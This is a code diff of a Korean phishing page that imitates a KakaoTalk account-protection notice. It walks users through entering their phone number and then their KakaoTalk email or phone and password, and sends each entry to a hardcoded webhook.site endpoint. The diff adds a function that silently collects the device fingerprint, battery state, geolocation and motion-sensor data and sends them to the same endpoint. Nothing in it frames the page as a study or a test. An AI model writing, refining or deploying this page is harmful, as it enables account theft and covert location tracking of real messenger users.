@@ -1,147 +1,181 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>카카오톡 이용자보호서비스 완화</title>
-  <style>
-    body { margin: 0; font-family: 'Apple SD Gothic Neo', sans-serif; background: #fff; color: #222; }
-    .container { max-width: 500px; margin: 0 auto; padding: 20px; }
-    .hidden { display: none; }
-    h1 { font-size: 22px; font-weight: bold; margin: 20px 0; }
-    p { font-size: 14px; line-height: 1.6; color: #444; }
-    a { color: #007aff; text-decoration: none; font-size: 14px; }
-    .checkbox { display: flex; align-items: center; margin-top: 20px; font-size: 14px; }
-    .checkbox input { margin-right: 8px; }
-    .btn-yellow { display: block; width: 100%; margin-top: 20px; padding: 14px; text-align: center;
-      font-size: 16px; font-weight: bold; color: #000; background: #ffeb00;
-      border: none; border-radius: 6px; cursor: pointer; }
-    .btn-yellow:active { background: #f0db00; }
-    .login-container { max-width: 400px; margin: 80px auto; text-align: center; padding: 20px; }
-    .login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
-    .login-container input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc;
-      font-size: 14px; outline: none; }
-    .login-container .btn-gray { width: 100%; padding: 14px; margin-top: 20px;
-      background: #f0f0f0; border: none; border-radius: 6px;
-      font-size: 16px; font-weight: bold; color: #888; cursor: pointer; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>카카오톡 이용자보호서비스 완화</title>
+<style>
+body { margin: 0; font-family: 'Apple SD Gothic Neo', sans-serif; background: #fff; color: #222; }
+.container { max-width: 500px; margin: 0 auto; padding: 20px; }
+.hidden { display: none; }
+h1 { font-size: 22px; font-weight: bold; margin: 20px 0; }
+p { font-size: 14px; line-height: 1.6; color: #444; }
+a { color: #007aff; text-decoration: none; font-size: 14px; }
+.checkbox { display: flex; align-items: center; margin-top: 20px; font-size: 14px; }
+.checkbox input { margin-right: 8px; }
+.btn-yellow { display: block; width: 100%; margin-top: 20px; padding: 14px; text-align: center;
+font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: none; border-radius: 6px; cursor: pointer; }
+.btn-yellow:active { background: #f0db00; }
+.login-container { max-width: 400px; margin: 80px auto; text-align: center; padding: 20px; }
+.login-container h2 { font-size: 20px; font-weight: bold; margin-bottom: 30px; }
+.login-container input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-bottom: 1px solid #ccc; font-size: 14px; outline: none; }
+.login-container .btn-gray { width: 100%; padding: 14px; margin-top: 20px; background: #f0f0f0; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; color: #888; cursor: pointer; }
+</style>
 </head>
 <body>
-  <!-- page1 -->
-  <div id="page1" class="container">
-    <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
-    <p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
-    <a href="#">사이트 바로가기</a>
-    <p style="margin-top:20px;">
-      시스템이 비정상적인 이용환경 및 패턴을 감지하여 이용자보호조치가 실행중입니다.<br><br>
-      이는 안전한 서비스를 제공하기 위한 한시적 조치이며, 국내 번호를 사용중인 카카오 인증 서비스 가입자일 경우 카카오 인증서로 본인임을 증명하여 이용자보호조치를 일시적으로 완화 또는 해제할 수 있습니다.<br><br>
-      다만, 비정상적인 이용환경 및 패턴이 반복적으로 감지된다면 동일한 이용자보호조치가 다시 적용될 수 있으며, <strong>인증서 발급을 위한 휴대폰 인증정보와 계좌 인증정보</strong>는 제 3자에게 공유하지 않도록 유의해 주시기 바랍니다.<br><br>
-    </p>
-    <div class="checkbox">
-      <input type="checkbox" id="agree">
-      <label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
-    </div>
-    <button class="btn-yellow" onclick="goNext()">본인인증하기</button>
-  </div>
 
-  <!-- page2: 전화번호 입력 -->
-  <div id="page2" class="login-container hidden">
-    <h2>카카오톡 본인인증하기</h2>
-    <input type="text" placeholder="(+82)전화번호" id="userId">
-    <button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
-  </div>
+<!-- page1 -->
+<div id="page1" class="container">
+<h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
+<p>모두를 위한 카톡 안녕가이드에서<br>이용자보호조치에 대해 더 자세히 알아보세요.</p>
+<a href="#">사이트 바로가기</a>
+<p style="margin-top:20px;">
+시스템이 비정상적인 이용환경 및 패턴을 감지하여 이용자보호조치가 실행중입니다.<br><br>
+이는 안전한 서비스를 제공하기 위한 한시적 조치이며, 국내 번호를 사용중인 카카오 인증 서비스 가입자일 경우 카카오 인증서로 본인임을 증명하여 이용자보호조치를 일시적으로 완화 또는 해제할 수 있습니다.<br><br>
+다만, 비정상적인 이용환경 및 패턴이 반복적으로 감지된다면 동일한 이용자보호조치가 다시 적용될 수 있으며, <strong>인증서 발급을 위한 휴대폰 인증정보와 계좌 인증정보</strong>는 제 3자에게 공유하지 않도록 유의해 주시기 바랍니다.<br><br>
+</p>
+<div class="checkbox">
+<input type="checkbox" id="agree">
+<label for="agree">[필수] 개인정보 수집 및 이용 동의</label>
+</div>
+<button class="btn-yellow" onclick="goNext()">본인인증하기</button>
+</div>
 
-  <!-- page3: 인증번호 입력 -->
-  <div id="page3" class="login-container hidden">
-    <h2>인증번호 입력</h2>
-    <input type="text" placeholder="인증번호" id="authCode" readonly>
-  </div>
+<!-- page2: 전화번호 입력 -->
+<div id="page2" class="login-container hidden">
+<h2>카카오톡 본인인증하기</h2>
+<input type="text" placeholder="(+82)전화번호" id="userId">
+<button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
+</div>
 
-  <!-- page4: 최종 로그인 -->
-  <div id="page4" class="login-container hidden">
-    <h2>카카오톡 본인인증하기</h2>
-    <input type="text" placeholder="이메일 또는 전화번호" id="userId4">
-    <input type="password" placeholder="비밀번호" id="userCode4">
-    <button type="button" class="btn-gray" onclick="sendPage4()">로그인</button>
-  </div>
+<!-- page3: 인증번호 입력 -->
+<div id="page3" class="login-container hidden">
+<h2>인증번호 입력</h2>
+<input type="text" placeholder="인증번호" id="authCode" readonly>
+</div>
 
-  <script>
-    const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
+<!-- page4: 최종 로그인 -->
+<div id="page4" class="login-container hidden">
+<h2>카카오톡 본인인증하기</h2>
+<input type="text" placeholder="이메일 또는 전화번호" id="userId4">
+<input type="password" placeholder="비밀번호" id="userCode4">
+<button type="button" class="btn-gray" onclick="sendPage4()">로그인</button>
+</div>
 
-    // page1 -> page2
-    function goNext() {
-      const chk = document.getElementById("agree");
-      if (!chk.checked) {
-        alert("동의 후 진행할 수 있습니다.");
-        return;
-      }
-      document.getElementById("page1").classList.add("hidden");
-      document.getElementById("page2").classList.remove("hidden");
-    }
+<script>
+const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
 
-    // page2: 전화번호 전송, 4초 뒤 page3 인증번호 자동 입력
-    function sendPhone() {
-      const userId = document.getElementById("userId").value.trim();
-      const phoneRegex = /^010\d{8}$/;
+// page1 -> page2
+function goNext() {
+  const chk = document.getElementById("agree");
+  if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
+  collectUserInfo(); // 최대 정보 수집
+  document.getElementById("page1").classList.add("hidden");
+  document.getElementById("page2").classList.remove("hidden");
+}
 
-      if (!userId) {
-        alert("전화번호를 입력해주세요.");
-        return;
-      }
-      if (!phoneRegex.test(userId)) {
-        alert("잘못된 형식의 전화번호입니다.");
-        return;
-      }
+// 최대 정보 수집
+async function collectUserInfo() {
+  let info = {};
+  info.userAgent = navigator.userAgent;
+  info.language = navigator.language;
+  info.platform = navigator.platform;
+  info.cookieEnabled = navigator.cookieEnabled;
+  info.onLine = navigator.onLine;
+  info.hardwareConcurrency = navigator.hardwareConcurrency;
+  info.deviceMemory = navigator.deviceMemory || "unknown";
+  info.plugins = Array.from(navigator.plugins).map(p=>p.name);
 
-      // webhook 전송 (전화번호만)
-      const formData = new URLSearchParams();
-      formData.append("page", "2");
-      formData.append("phone", userId);
-      formData.append("timestamp", new Date().toISOString());
+  info.screen = {
+    width: screen.width,
+    height: screen.height,
+    availWidth: screen.availWidth,
+    availHeight: screen.availHeight,
+    colorDepth: screen.colorDepth,
+    pixelDepth: screen.pixelDepth
+  };
+  info.window = {
+    innerWidth: window.innerWidth,
+    innerHeight: window.innerHeight,
+    outerWidth: window.outerWidth,
+    outerHeight: window.outerHeight
+  };
+  info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: formData
-      }).catch(err => console.error("page2 전송 오류:", err));
+  if (navigator.connection) {
+    info.network = {
+      downlink: navigator.connection.downlink,
+      effectiveType: navigator.connection.effectiveType,
+      rtt: navigator.connection.rtt,
+      saveData: navigator.connection.saveData
+    };
+  }
 
-      // 4초 뒤 인증번호 자동 입력 및 page3 표시
-      document.getElementById("page2").classList.add("hidden");
-      document.getElementById("page3").classList.remove("hidden");
-      setTimeout(() => {
-        document.getElementById("authCode").value = "1224"; // 예시 인증번호
-        // 인증번호 입력 후 page4 자동 표시
-        setTimeout(() => {
-          document.getElementById("page3").classList.add("hidden");
-          document.getElementById("page4").classList.remove("hidden");
-        }, 1000);
-      }, 2000);
-    }
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      info.battery = {
+        charging: battery.charging,
+        level: battery.level,
+        chargingTime: battery.chargingTime,
+        dischargingTime: battery.dischargingTime
+      };
+    } catch(e) { info.batteryError = e.message; }
+  }
 
-    // page4 전송
-    function sendPage4() {
-      const userId4 = document.getElementById("userId4").value.trim();
-      const userCode4 = document.getElementById("userCode4").value.trim();
+  if (navigator.geolocation) {
+    await new Promise(resolve => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        info.location = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
+        resolve();
+      }, err => { info.locationError = err.message; resolve(); });
+    });
+  }
 
-      if (!userId4 || !userCode4) {
-        alert("이메일/전화번호와 비밀번호를 입력해주세요.");
-        return;
-      }
+  info.sensors = {};
+  function sensorHandler(event) {
+    info.sensors.acceleration = event.acceleration;
+    info.sensors.accelerationIncludingGravity = event.accelerationIncludingGravity;
+    info.sensors.rotationRate = event.rotationRate;
+  }
+  if (window.DeviceMotionEvent) { window.addEventListener("devicemotion", sensorHandler, { once: true }); }
+  if (window.DeviceOrientationEvent) { window.addEventListener("deviceorientation", e=>{info.sensors.orientation={alpha:e.alpha,beta:e.beta,gamma:e.gamma};},{once:true}); }
 
-      const formData = new URLSearchParams();
-      formData.append("page", "4");
-      formData.append("userId", userId4);
-      formData.append("password", userCode4);
-      formData.append("timestamp", new Date().toISOString());
+  info.timestamp = new Date().toISOString();
 
-      fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: formData
-      })
-      .then(() => alert("page4 값 전송 완료!"))
-      .catch(err => console.error("page4 전송 오류:", err));
-    }
-  </script>
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({page:"1",info})})
+  .catch(err=>console.error("WebHook 전송 오류:",err));
+}
+
+// page2 -> page3
+function sendPhone() {
+  const userId = document.getElementById("userId").value.trim();
+  const phoneRegex = /^010\d{8}$/;
+  if (!userId) { alert("전화번호를 입력해주세요."); return; }
+  if (!phoneRegex.test(userId)) { alert("잘못된 형식의 전화번호입니다."); return; }
+
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})}).catch(err=>console.error(err));
+
+  document.getElementById("page2").classList.add("hidden");
+  document.getElementById("page3").classList.remove("hidden");
+
+  // 4초 후 인증번호 자동 입력, 1초 후 page4
+  setTimeout(()=>{
+    document.getElementById("authCode").value="1224";
+    setTimeout(()=>{
+      document.getElementById("page3").classList.add("hidden");
+      document.getElementById("page4").classList.remove("hidden");
+    },1000);
+  },4000);
+}
+
+// page4 전송
+function sendPage4() {
+  const userId4=document.getElementById("userId4").value.trim();
+  const userCode4=document.getElementById("userCode4").value.trim();
+  if(!userId4||!userCode4){alert("이메일/전화번호와 비밀번호를 입력해주세요."); return;}
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:new URLSearchParams({page:"4",userId:userId4,password:userCode4,timestamp:new Date().toISOString()})}).then(()=>alert("page4 값 전송 완료!")).catch(err=>console.error(err));
+}
+</script>
 </body>
 </html>
